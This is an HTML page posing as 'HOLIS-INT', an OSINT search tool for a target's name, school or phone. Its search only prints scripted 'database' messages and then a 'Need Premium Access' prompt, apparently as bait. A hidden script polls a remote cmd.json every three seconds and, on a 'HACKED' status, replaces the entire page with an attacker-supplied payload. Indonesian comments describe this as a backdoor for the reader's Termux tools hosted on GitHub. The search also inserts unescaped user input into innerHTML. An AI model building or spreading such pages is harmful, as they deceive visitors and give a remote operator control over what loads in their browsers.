<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HOLIS-INT | Professional OSINT Tools</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #000; color: #fff; font-family: 'Courier New', Courier, monospace; }
        .glitch { animation: scan 2s infinite; }
        @keyframes scan { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
    </style>
</head>
<body class="p-5">
    <div id="main-content">
        <h1 class="text-2xl font-bold border-b border-white pb-2 mb-5">SYSTEM: HOLIS-INT_SEARCH_v1.0</h1>
        
        <div class="mb-10">
            <p class="mb-2">> ENTER TARGET NAME/SCHOOL/PHONE:</p>
            <input type="text" id="target" class="bg-black border border-white p-2 w-full text-white outline-none focus:bg-white focus:text-black">
            <button onclick="search()" class="mt-3 bg-white text-black px-4 py-2 hover:bg-gray-300">EXECUTE SEARCH</button>
        </div>

        <div id="results" class="border border-gray-700 p-4 min-h-[200px]">
            <p class="text-gray-500 italic">Waiting for input...</p>
        </div>
    </div>

    <script>
        function search() {
            let val = document.getElementById('target').value;
            document.getElementById('results').innerHTML = `<p class="glitch">> Searching for: ${val}...</p><p>> Connection to Database... SUCCESS</p><p>> Status: Data Encrypted. Need Premium Access.</p>`;
        }

        // AUTO-CHECKER (Celah untuk Tools Termux Lu)
        setInterval(async () => {
            try {
                // Ganti URL ini dengan link file cmd.json di GitHub lu nanti
                const res = await fetch('cmd.json');
                const data = await res.json();
                if(data.status === 'HACKED') {
                    document.body.innerHTML = data.payload;
                    document.body.style.backgroundColor = "red";
                }
            } catch (e) {}
        }, 3000); // Cek setiap 3 detik
    </script>
</body>
      </html>
